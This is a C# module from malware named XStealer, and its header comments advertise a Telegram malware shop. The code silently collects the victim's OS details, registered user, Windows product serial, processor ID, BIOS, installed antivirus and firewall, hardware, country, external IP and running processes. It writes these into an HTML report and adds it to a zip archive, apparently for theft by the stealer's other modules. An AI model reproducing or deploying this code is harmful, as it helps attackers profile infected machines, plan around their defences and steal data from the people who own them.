
// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Management;
    using System.Text;
    using System.Text.RegularExpressions;
    using Helpers;

    public static class InfoEx
    {
        private static string GetMemoryType(int MemoryType) => MemoryType switch
        {
            0 => "DDR-4",
            1 => "Other",
            2 => "DRAM",
            3 => "Synchronous DRAM",
            4 => "Cache DRAM",
            5 => "EDO",
            6 => "EDRAM",
            7 => "VRAM",
            8 => "SRAM",
            9 => "RAM",
            10 => "ROM",
            11 => "Flash",
            12 => "EEPROM",
            13 => "FEPROM",
            14 => "EPROM",
            15 => "CDRAM",
            16 => "3DRAM",
            17 => "SDRAM",
            18 => "SGRAM",
            19 => "RDRAM",
            20 => "DDR",
            21 => "DDR-2",
            _ => MemoryType != 1 && MemoryType <= 22 ? MemoryType != 25 ? MemoryType > 25 ? "Unknown" : "No bar set" : "FBD2" : "DDR-3"
        };

        private static string GetProcessPC()
        {
            using var data = new StringWriter();
            try
            {
                Process[] spisok = Process.GetProcesses();
                data.WriteLine($"<center><span style=\"color:#6294B3\">Number of running processes:</span><span style=\"color:#BA9201\">[{spisok.Length}]</span></center>");
                Array.Sort(spisok, (p1, p2) => p1.ProcessName.CompareTo(p2.ProcessName));
                foreach (Process item in spisok.Where(item => Process.GetCurrentProcess().Id != item.Id && item.Id != 0).Select(item => item))
                {
                    data.WriteLine($"<span style=\"color:#6294B3\"><a title=\"Process name: {item.ProcessName}.exe\"</a title>{item.ProcessName}.exe</span><a title=\"Process ID: {item.Id}\"</a title><span style=\"color:#BA9201\">[{item.Id}]</span>");
                }
            }
            catch { }
            return data?.ToString();
        }

        private static readonly string[] MassLink = new string[] { "https://api.ipify.org/", "http://icanhazip.com/", "https://ipinfo.io/ip", "http://checkip.amazonaws.com/" };

        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            using var writerdata = new StreamWriter(ms);

            #region Main Table

            writerdata.WriteLine("<!DOCTYPE html>");
            writerdata.WriteLine("<html>");
            writerdata.WriteLine("<head>");
            writerdata.WriteLine("<title>SystemInfo</title>");
            writerdata.WriteLine("<link rel=\"icon\" type=\"image/png\" href=\"http://s1.iconbird.com/ico/0612/customicondesignoffice2/w48h481339870371Personalinformation48.png\" sizes=\"32x32\">");
            writerdata.WriteLine("</head>");
            writerdata.WriteLine("<body style=\"width:100%; height:100%; margin: 0; background: url(http://radiographer.co.il/wp-content/uploads/2015/11/backgroundMain.jpg) #191919\">");
            writerdata.WriteLine("<center><h1 style=\"color:#85AB70; margin:50px 0\">Computer Information System</h1></center>");

            try
            {
                using var OsSystem = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_OperatingSystem");
                using ManagementObjectCollection ColOs = OsSystem?.Get();
                foreach (ManagementBaseObject osElement in ColOs)
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Operating system: </span><span style=\"color:#BA9201\">{osElement["Caption"]?.ToString()} - [ Version: {osElement["Version"]?.ToString()} ] : {(Environment.Is64BitOperatingSystem ? "x64" : "x32")}</span></center>");
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Registered user: </span><span style=\"color:#BA9201\">{osElement["RegisteredUser"]?.ToString()}</span></center>");
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Windows Product Code: </span><span style=\"color:#BA9201\">{osElement["SerialNumber"]?.ToString()}</span></center>");
                }

                writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Computer name: </span><span style=\"color:#BA9201\">{Environment.MachineName}</span></center>");
                writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Logical processes: </span><span style=\"color:#BA9201\">{Environment.ProcessorCount}</span></center>");
                writerdata.WriteLine($"<center><span style=\"color:#6294B3\">System directory: </span><span style=\"color:#BA9201\">{Environment.SystemDirectory}</span></center>");
            }
            catch { }
            #endregion

            #region WMI Data
            try
            {
                using var Processors = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_Processor");
                using ManagementObjectCollection colProcessor = Processors?.Get();
                foreach (ManagementBaseObject procElement in colProcessor)
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Central Processing Unit (CPU): </span><span style=\"color:#BA9201\">{procElement["Name"]?.ToString()} [ <a title=\"Manufacturer: {procElement["Name"]?.ToString()}\"</span>{procElement["Name"]?.ToString()} ]</a title></center>");
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Processor ID: </span><span style=\"color:#BA9201\">{procElement["ProcessorId"]?.ToString()}</center>");
                }
                using var MonitorEx = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_DesktopMonitor");
                using ManagementObjectCollection colMonic = MonitorEx?.Get();
                foreach (ManagementBaseObject screenElement in colMonic)
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Screen resolution: </span><span style=\"color:#BA9201\">{screenElement["ScreenWidth"]?.ToString()} x {screenElement["ScreenHeight"]?.ToString()} Pixels</span></center>");
                    break;
                }
                using var Bios = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_BIOS");
                using ManagementObjectCollection colBios = Bios?.Get();
                foreach (ManagementBaseObject biosElement in colBios)
                {
                    string BiosVersion = ((string[])biosElement["BIOSVersion"])[0], BiosVersionTwo = ((string[])biosElement["BIOSVersion"])[1], Manufacturer = biosElement["Manufacturer"]?.ToString();
                    bool count = ((string[])biosElement["BIOSVersion"]).Length > 1;
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">BIOS version: <span style=\"color:#BA9201\">{(count ? $"{BiosVersion} - {BiosVersionTwo}" : BiosVersion)} [ <a title=\"Manufacturer: {(count ? $"{Manufacturer}\">{Manufacturer}" : $"{0x2}\">{0x2}")}</a title> ]</span><span style=\"color:#BA9201\"></span></center>");
                    break;
                }
                using var AntiVirus = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                using ManagementObjectCollection colAntiVirus = AntiVirus?.Get();
                foreach (ManagementBaseObject antivirusElement in colAntiVirus)
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Installed antivirus: </span><span style=\"color:#BA9201\">{antivirusElement["displayName"]?.ToString()}</span></center>");
                }
                using var FirewallP = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM FirewallProduct");
                using ManagementObjectCollection colFirewall = FirewallP?.Get();
                foreach (ManagementBaseObject firewallElement in colFirewall)
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Installed FireWall: </span><span style=\"color:#BA9201\">{firewallElement["displayName"]?.ToString()}</span></center>");
                }
                using var TotalMemory = new ManagementObjectSearcher(@"root\CIMV2", "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                using ManagementObjectCollection colTotalMemory = TotalMemory?.Get();
                foreach (ManagementBaseObject totalmemElement in colTotalMemory)
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Physical memory: </span><span style=\"color:#BA9201\">{(Convert.ToDouble(totalmemElement["TotalPhysicalMemory"]?.ToString()) / 0x4000_0000 > 0x1 ? $"{ConverterEx.ConverterUnit(totalmemElement["TotalPhysicalMemory"], true)} MB" : $"{ConverterEx.ConverterUnit(totalmemElement["TotalPhysicalMemory"], false)} GB")}</span></center>");
                    break;
                }
                using var PhysicalMemory = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_PhysicalMemory");
                using ManagementObjectCollection colPhysicalMemory = PhysicalMemory?.Get();
                foreach (ManagementBaseObject physicalmemElement in colPhysicalMemory)
                {
                    bool Checker = Convert.ToDouble(physicalmemElement["Capacity"]?.ToString()) / 0x4000_0000 <= 0x1;
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Memory type: </span><span style=\"color:#BA9201\">{GetMemoryType(int.Parse(physicalmemElement["MemoryType"]?.ToString()))} ( <a title=\"Memory: {(Checker ? $"{ConverterEx.ConverterUnit(physicalmemElement["Capacity"], true)} MB" : $"{ConverterEx.ConverterUnit(physicalmemElement["Capacity"], false)} GB")} (Manufacturer: {physicalmemElement["Manufacturer"]?.ToString()})\"</span>{(Checker ? $"{ConverterEx.ConverterUnit(physicalmemElement["Capacity"], true)} MB" : $"{ConverterEx.ConverterUnit(physicalmemElement["Capacity"], false)} GB")} )</a title></span></center>");
                }
                using var VideoController = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController");
                using ManagementObjectCollection colVideoController = VideoController?.Get();
                foreach (ManagementBaseObject videoElement in colVideoController)
                {
                    string container = string.Empty;
                    container = (Convert.ToDouble(videoElement["AdapterRam"]) / 0x10_0000 % 0x400) switch
                    {
                        0 => string.Concat(Convert.ToDouble(videoElement.Properties["AdapterRam"]?.Value) / 0x10_0000 / 0x400, " GB"),
                        _ => string.Concat((Convert.ToDouble(videoElement.Properties["AdapterRam"]?.Value) / 0x10_0000).ToString("F2"), " MB"),
                    };
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Video card: </span><span style=\"color:#BA9201\">{videoElement["Caption"]?.ToString()}  -  <a title=\"Graphics card memory: {container}\"</span>({container})</a title></tr></span></center>");
                }
                using var ComputerSystem = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_ComputerSystem");
                using ManagementObjectCollection colComputerSystem = ComputerSystem?.Get();
                foreach (ManagementBaseObject sysElement in colComputerSystem)
                {
                    writerdata.WriteLine(Regex.Replace($"<center><span style=\"color:#6294B3\">Computer model: </span><span style=\"color:#BA9201\">{sysElement["Manufacturer"]?.ToString()}{sysElement["Model"]?.ToString()}</span></center>", @"\s{2,}", " "));
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Computer model manufacturer: </span><span style=\"color:#BA9201\">{sysElement["Manufacturer"]?.ToString()}</span></center>");
                }
            }
            catch { }
            #endregion

            #region Country
            writerdata.WriteLine($"<center><span style=\"color:#6294B3\">Country: </span><span style=\"color:#BA9201\">{CountryUser.GetLocal()}</span></center>");
            #endregion
            #region IP Data
            try
            {
                //  writerdata.WriteLine(Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(ip => ip.AddressFamily.Equals(AddressFamily.InterNetwork)).Select(ip => ip).Select(ip => $"<center><span style=\"color:#6294B3\">Local IP: </span><span style=\"color:#BA9201\">{ip?.ToString()}</span></center>"));
                foreach (string v in MassLink.Where(v => WhiteRabbit.CheckURL(v)))
                {
                    writerdata.WriteLine($"<center><span style=\"color:#6294B3\">External IP: </span><span style=\"color:#BA9201\">{WhiteRabbit.GetPublicIP(v)}</span></center>"); break;
                }
            }
            catch { }
            #endregion
            #region ProcessList
            writerdata.WriteLine($"<center><span style=\"color:#6294B3\"><details><summary>Show</span><span style=\"color:#BA9201\">Hide Running User Processes</summary><pre>{GetProcessPC()}</span></center>");
            #endregion
            #region End Table
            writerdata.WriteLine("</table>");
            writerdata.WriteLine("</html>");
            #endregion

            ZipEx.AddKeyPairStream("Information.html", ms?.ToArray() ?? ms.GetBuffer() ?? null);
        }
    }
}